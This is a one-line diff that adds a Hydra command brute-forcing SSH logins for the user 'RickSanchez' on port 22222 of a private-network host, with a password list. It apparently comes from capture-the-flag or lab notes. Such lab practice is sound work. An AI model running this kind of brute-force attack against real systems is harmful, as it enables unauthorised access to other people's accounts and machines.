@@ -1,0 +1,1 @@
+hydra -l RickSanchez -P pw.txt -t4 -s 22222 192.168.0.163 ssh
